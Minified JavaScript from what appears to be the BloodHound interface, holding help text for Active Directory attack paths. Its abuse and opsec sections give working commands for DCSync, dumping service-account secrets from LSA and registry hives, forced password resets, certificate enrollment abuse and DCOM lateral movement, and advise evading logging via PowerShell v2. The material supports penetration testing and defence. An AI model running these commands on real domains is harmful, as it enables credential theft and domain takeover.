filtering.",e.jsx("p",{className:"my-4",children:"SID filtering removes domain SIDs from authentication requests of foreign principals based on the trust configuration. Built-in SIDs (S-1-5-32-*) are always filtered, regardless of the configuration. For cross-forest trusts, blocking spoof SID history attacks requires filtering out SIDs that do not belong to the forest of the trusted domain."}),e.jsxs("p",{className:"my-4",children:["Cross-forest trusts blocks spoof SID history attacks by default. Forest trusts filter out SIDs that do not belong to the forest of the trusted domain. However, SID filtering for forest trusts can be relaxed by enabling the ",e.jsx("code",{children:"trustAttributes"})," flag ",e.jsx("code",{children:"TREAT_AS_EXTERNAL"}),". When enabled, SID filtering behaves like it does for external trusts (without quarantine mode), meaning only SIDs with a RID below 1000 (built-in AD principals) are filtered, allowing a potential spoof SID history attack."]}),e.jsxs("p",{className:"my-4",children:["External trusts have ",e.jsx("i",{children:"quarantine mode"})," (",e.jsx("code",{children:"trustAttributes"})," flag"," ",e.jsx("code",{children:"QUARANTINED_DOMAIN"}),") enabled by default, protecting the trusting domain by filtering out SIDs that do not belong to the trusted domain in authentication requests. An external trust with quarantine mode disabled does not block spoof SID history attacks."]}),"SID filtering is managed from the outbound side of the trust. As a result, this property is only created if trust data from the outbound side has been ingested."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"TGT Delegation"}),e.jsx("br",{}),"TGT delegation determines whether unconstrained delegation is allowed over the trust. When a principal from the trusted domain authenticates against a Kerberos resource with unconstrained delegation in the trusting domain, their Kerberos TGT (Ticket Granting Ticket) is forwarded to the resource as part of Kerberos authentication, but only if TGT delegation is enabled (true).",e.jsxs("p",{className:"my-4",children:["By default, TGT delegation is disabled for cross-forest trusts. It is enabled if the"," ",e.jsx("code",{children:"trustAttributes"})," flag ",e.jsx("code",{children:"CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION"})," is enabled for the trust and ",e.jsx("i",{children:"quarantine mode"})," (",e.jsx("code",{children:"trustAttributes"})," flag"," ",e.jsx("code",{children:"QUARANTINED_DOMAIN"}),") is NOT enabled."]}),"TGT delegation is controlled from the inbound side of the trust, and the property is therefore only created if trust data from this side has been ingested."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Transitive"}),e.jsx("br",{}),"Transitivity defines whether the trust extends beyond the two domains involved. A transitive trust allows access not only to principals of the trusted domain but also to those from other domains trusted by the trusted domain.",e.jsx("p",{className:"my-4",children:"Forest trusts are always transitive, external trusts are non-transitive."}),'Attackers can bypass the limitations of non-transitive trusts by manually requesting local Kerberos TGTs for each domain in the trust chain. They can then use these local TGTs to access Kerberos resources that would otherwise be denied if requested directly. For more details, refer to "External trusts are evil" under References.']}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Trust Attributes"}),e.jsx("br",{}),"This property stores the raw value of the ",e.jsx("code",{children:"trustAttributes"})," LDAP attribute, which defines the trust's configuration settings. BloodHound retains this property from both the outbound and inbound sides of the trust, as they may differ."]}),e.jsxs(t,{variant:"body2",children:[e.jsx("b",{children:"Trust Type"}),e.jsx("br",{}),'The trust type for cross-forest trusts can be Forest, External, Kerberos (Realm), or Unknown. Refer to the "Microsoft AD Trust Technical Documentation" under References for more details.']})]}),xh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)",children:"Microsoft AD Trust Technical Documentation"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://exploit.ph/external-trusts-are-evil.html",children:"External trusts are evil"}),e.jsx("br",{})]}),jh={general:gh,abuse:yh,references:xh},wh=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"This edge indicates that the computer is a domain controller for the domain. This edge is not created for read-only domain controllers."})}),vh=()=>e.jsx(t,{variant:"body2",children:"Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."}),Ah=()=>e.jsx(t,{variant:"body2",children:"Domain Controllers are universally among the most sensitive systems in Active Directory, and are often closely monitored by defenders. Attacks that rely on administrative access to a domain controller may produce artifacts that defenders will see as reliable and urgent indicators of compromise."}),Sh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=3700",children:"Beyond Domain Admins"}),e.jsx("br",{})]}),Ch=()=>e.jsx(t,{variant:"body2",children:"Domain Controllers store all Active Directory credentials and configurations for all principals in the domain. If an adversary gains administrative access to a Domain Controller, there are several options at their disposal for compromising domain identities and domain-managed systems. Please see the references section for more information."}),kh={general:wh,windowsAbuse:Ch,linuxAbuse:vh,opsec:Ah,references:Sh},Th=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All permission on the domain ",o,"."]}),e.jsx(t,{variant:"body2",children:"These two permissions allow a principal to perform a DCSync attack."})]}),Ph=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"}),e.jsx(t,{component:"pre",children:"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Dh=()=>e.jsx(t,{variant:"body2",children:"For detailed information on detection of dcsync as well as opsec considerations, see the adsecurity post in the references tab."}),Oh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://adsecurity.org/?p=1729",children:"https://adsecurity.org/?p=1729"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/",children:"https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"})]}),Rh=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."})]}),Eh={general:Th,windowsAbuse:Rh,linuxAbuse:Ph,opsec:Dh,references:Oh},Ih=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is delegated the privilege to enroll certificates of the certificate template ",o," as an enrollment agent."]}),e.jsx(t,{variant:"body2",children:"The certificate template is published to an enterprise CA where the enrollment agent restrictions are configured to allow this principal to enroll certificates against this template as an enrollment agent. BloodHound does not assess what principals the enrollment agent is allowed to enroll on behalf of."})]}),$h=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."}),Gh=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),Nh=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"})}),Mh=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."}),Lh={general:Ih,windowsAbuse:Mh,linuxAbuse:$h,opsec:Gh,references:Nh},Fh=({sourceName:r,targetName:a})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["From an elevated command prompt on ",r,", run mimikatz then execute the following commands:"]}),e.jsx(t,{component:"pre",children:`privilege::debug
token::elevate
lsadump::secrets`}),e.jsxs(t,{variant:"body2",children:["In the output, find"," ",e.jsxs(t,{component:"pre",children:["_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_",a==null?void 0:a.toLowerCase().split("@")[0]]}),". The next line contains ",e.jsx(t,{component:"pre",children:"cur/hex :"})," followed with ",a,"'s password hex-encoded."]}),e.jsx(t,{variant:"body2",children:"To use this password, its NT hash must be calculated. This can be done using a small python script:"}),e.jsx(t,{component:"pre",children:`# nt.py
import sys, hashlib

pw_hex = sys.argv[1]
nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()

print(nt_hash)`}),e.jsx(t,{variant:"body2",children:"Execute it like so:"}),e.jsx(t,{component:"pre",children:"python3 nt.py 35f3e1713d61..."}),e.jsx(t,{variant:"body2",children:"To authenticate as the sMSA, leverage pass-the-hash."}),e.jsxs(t,{variant:"body2",children:["Alternatively, to avoid executing mimikatz on ",r,", you can save a copy of the"," ",e.jsx(t,{component:"pre",children:"SYSTEM"})," and"," ",e.jsx(t,{component:"pre",children:"SECURITY"})," registry hives from an elevated prompt:"]}),e.jsx(t,{component:"pre",children:"reg save HKLM\\SYSTEM %temp%\\SYSTEM & reg save HKLM\\SECURITY %temp%\\SECURITY"}),e.jsxs(t,{variant:"body2",children:["Transfer the files named ",e.jsx(t,{component:"pre",children:"SYSTEM"})," and"," ",e.jsx(t,{component:"pre",children:"SECURITY"})," that were saved at"," ",e.jsx(t,{component:"pre",children:"%temp%"})," to another computer where mimikatz can be safely executed. On this other computer, run mimikatz from a command prompt then execute the following command to obtain the hex-encoded password:"]}),e.jsx(t,{component:"pre",children:"lsadump::secrets /system:C:\\path\\to\\file\\SYSTEM /security:C:\\path\\to\\file\\SECURITY"})]}),_h=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," the Standalone Managed Service Account (sMSA) ",o," ","installed on it."]}),e.jsxs(t,{variant:"body2",children:["With administrative privileges on ",r,", it is possible to dump ",o,"'s password stored in LSA secrets."]})]}),Uh=()=>e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"Access to registry hives can be monitored and alerted via event ID 4656 (A handle to an object was requested)."})}),Wh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html",children:"https://simondotsh.com/infosec/2022/12/12/assessing-smsa.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets",children:"https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/gentilkiwi/mimikatz",children:"https://github.com/gentilkiwi/mimikatz"})]}),Bh={general:_h,abuse:Fh,opsec:Uh,references:Wh},qh=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," has enrollment rights against the target node, ",o,"."]}),e.jsx(t,{variant:"body2",children:"The target node may be a Certificate Template or an Enterprise Certification Authority."})]}),Kh=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Certipy can be used to enroll a certificate:"}),e.jsx(t,{component:"pre",children:"certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE"}),e.jsxs(t,{variant:"body2",children:["The following requirements must be met for a principal to be able to enroll a certificate:",e.jsx("br",{}),"1) The principal has enrollment rights on a certificate template",e.jsx("br",{}),"2) The certificate template is published on an enterprise CA",e.jsx("br",{}),"3) The principal has Enroll permission on the enterprise CA",e.jsx("br",{}),"4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"]})]}),zh=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),Hh=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Certify",children:"https://github.com/GhostPack/Certify"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/ly4k/Certipy",children:"https://github.com/ly4k/Certipy"})]}),Vh=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Certify can be used to enroll a certificate:"}),e.jsx(t,{component:"pre",children:"Certify.exe request --ca SERVER\\CA-NAME --template TEMPLATE"}),e.jsxs(t,{variant:"body2",children:["The following requirements must be met for a principal to be able to enroll a certificate:",e.jsx("br",{}),"1) The principal has enrollment rights on a certificate template",e.jsx("br",{}),"2) The certificate template is published on an enterprise CA",e.jsx("br",{}),"3) The principal has Enroll permission on the enterprise CA",e.jsx("br",{}),"4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"]})]}),Yh={general:qh,windowsAbuse:Vh,linuxAbuse:Kh,opsec:zh,references:Hh},Qh=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," can be used to enroll certificates on behalf of other principals for the certificate template ",o,"."]}),e.jsxs(t,{variant:"body2",children:["The certificate template ",r," is configured to be used as an enrollment agent. The certificate template ",o," is configured to allow enrollment by enrollment agents. Both certificate templates are published by an enterprise CA which is trusted for NT authentication and chain up to a root CA for the domain. This enables a principal with a certificate of certificate template ",r," to enroll on behalf of other principals for certificate template ",o," as long as enrollment agent restrictions configured on the enterprise CA permit it."]})]}),Jh=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."}),Xh=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),Zh=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"})}),ep=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."}),tp={general:Qh,windowsAbuse:ep,linuxAbuse:Jh,opsec:Xh,references:Zh},rp=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The ",N(a)," ",r," is an enterprise certification authority for ",o,"."]}),e.jsx(t,{variant:"body2",children:"The Enterprise Certification Authority node is the enrollment service LDAP object for the target AIACA/Root Certification Authority node."})]}),np=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),ap=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),op=()=>e.jsx(l,{sx:{overflowX:"auto"},children:e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"})}),ip=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."}),sp={general:rp,windowsAbuse:ip,linuxAbuse:np,opsec:ap,references:op},cp=({targetName:r})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The PowerShell script Invoke-DCOM implements lateral movement using a variety of different COM objects (ProgIds: MMC20.Application, ShellWindows, ShellBrowserWindow, ShellBrowserWindow, and ExcelDDE). LethalHTA implements lateral movement using the HTA COM object (ProgId: htafile)."}),e.jsx(t,{variant:"body2",children:"One can manually instantiate and manipulate COM objects on a remote machine using the following PowerShell code. If specifying a COM object by its CLSID:"}),e.jsx(t,{component:"pre",children:`$ComputerName = ${r}  # Remote computer
$clsid = "{fbae34e8-bf95-4da8-bf98-6c6e580aa348}"      # GUID of the COM object
$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)`}),e.jsx(t,{variant:"body2",children:"If specifying a COM object by its ProgID:"}),e.jsx(t,{component:"pre",children:`$ComputerName = ${r}  # Remote computer
$ProgId = "<NAME>"      # GUID of the COM object
$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)
$ComObject = [Activator]::CreateInstance($Type)`})]}),lp=({sourceName:r,sourceType:a,targetName:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:[E(a,r)," membership in the Distributed COM Users local group on the computer ",o,"."]}),e.jsx(t,{variant:"body2",children:"This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods."})]}),dp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"The artifacts generated when using DCOM vary depending on the specific COM object used."}),e.jsx(t,{variant:"body2",children:"DCOM is built on top of the TCP/IP RPC protocol (TCP ports 135 + high ephemeral ports) and may leverage several different RPC interface UUIDs(outlined here). In order to use DCOM, one must be authenticated. Consequently, logon events and authentication-specific logs(Kerberos, NTLM, etc.) will be generated when using DCOM."}),e.jsx(t,{variant:"body2",children:"Processes may be spawned as the user authenticating to the remote system, as a user already logged into the system, or may take advantage of an already spawned process."}),e.jsxs(t,{variant:"body2",children:['Many DCOM servers spawn under the process "svchost.exe -k DcomLaunch" and typically have a command line containing the string " -Embedding" or are executing inside of the DLL hosting process "DllHost.exe /Processid:',"{<AppId>}",'" (where AppId is the AppId the COM object is registered to use). Certain COM services are implemented as service executables; consequently, service-related event logs may be generated.']})]}),hp=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/",children:"https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/",children:"https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/",children:"https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/",children:"https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom ",children:"https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.cybereason.com/blog/dcom-lateral-movement-techniques",children:"https://www.cybereason.com/blog/dcom-lateral-movement-techniques"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/",children:"https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://attack.mitre.org/wiki/Technique/T1175",children:"https://attack.mitre.org/wiki/Technique/T1175"}),e.jsx(t,{variant:"body1",children:"Invoke-DCOM"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1",children:"https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1"}),e.jsx(t,{variant:"body1",children:"LethalHTA"}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://codewhitesec.blogspot.com/2018/07/lethalhta.html",children:"https://codewhitesec.blogspot.com/2018/07/lethalhta.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/codewhitesec/LethalHTA/ ",children:"https://github.com/codewhitesec/LethalHTA/"})]}),pp={general:lp,abuse:cp,opsec:dp,references:hp},up=({sourceName:r,targetName:a})=>e.jsx(e.Fragment,{children:e.jsxs(t,{variant:"body2",children:["Certificates of the certificate template ",r," will include the issuance policy ",a," as a certificate extension."]})}),mp=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."}),bp=()=>e.jsx(t,{variant:"body2",children:"When an attacker abuses a privilege escalation or impersonation primitive that relies on this relationship, it will necessarily result in the issuance of a certificate. A copy of the issued certificate will be saved on the host that issued the certificate."}),fp=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"ADCS ESC13 Abuse Technique"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd378897(v=ws.10)?redirectedfrom=MSDN",children:"Authentication Mechanism Assurance for AD DS in Windows Server 2008 R2 Step-by-Step Guide"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.gradenegger.eu/en/using-authentication-mechanism-assurance-ama-to-secure-the-login-of-administrative-accounts/",children:"Use Authentication Mechanism Assurance (AMA) to secure administrative account logins"})]}),yp=()=>e.jsx(t,{variant:"body2",children:"An attacker may perform the ADCS ESC13 abuse which relies on an issuance policy included in a certificate. This relationship alone is not enough to escalate rights or impersonate other principals."}),gp={general:up,windowsAbuse:yp,linuxAbuse:mp,opsec:bp,references:fp},xp=({sourceName:r,sourceType:a,targetName:o,targetType:i})=>e.jsxs(t,{variant:"body2",children:[E(a,r)," the capability to change the ",N(i)," ",o,"'s password without knowing that user's current password."]}),jp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),e.jsx(t,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),e.jsxs(t,{variant:"body2",children:["It can also be done with pass-the-hash using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]}),e.jsx(t,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]}),wp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"Executing this abuse with the net binary will necessarily require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts."}),e.jsx(t,{variant:"body2",children:"Regardless of what execution procedure you use, this action will generate a 4724 event on the domain controller that handled the request. This event may be centrally collected and analyzed by security analysts, especially for users that are obviously very high privilege groups (i.e.: Domain Admin users). Also be mindful that PowerShell v5 introduced several key security features such as script block logging and AMSI that provide security analysts another detection opportunity. You may be able to completely evade those features by downgrading to PowerShell v2."}),e.jsx(t,{variant:"body2",children:"Finally, by changing a service account password, you may cause that service to stop functioning properly. This can be bad not only from an opsec perspective, but also a client management perspective. Be careful!"})]}),vp=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.sixdub.net/?p=579",children:"https://www.sixdub.net/?p=579"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724",children:"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4724"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"})]}),Ap=({sourceName:r,sourceType:a})=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."})]}),Sp={general:xp,windowsAbuse:Ap,linuxAbuse:jp,opsec:wp,references:vp},Cp=({sourceName:r,targetName:a,targetType:o})=>e.jsxs(e.Fragment,{children:[e.jsxs(t,{variant:"body2",children:["The GPO ",r," is linked to the ",N(o)," ",a,"."]}),e.jsx(t,{variant:"body2",children:"A linked GPO applies its settings to objects in the linked container."})]}),kp=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]}),Tp=()=>e.jsx(t,{variant:"body2",children:"There are no opsec considerations related to this edge."}),Pp=()=>e.jsxs(e.Fragment,{children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://wald0.com/?p=179",children:"https://wald0.com/?p=179"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener 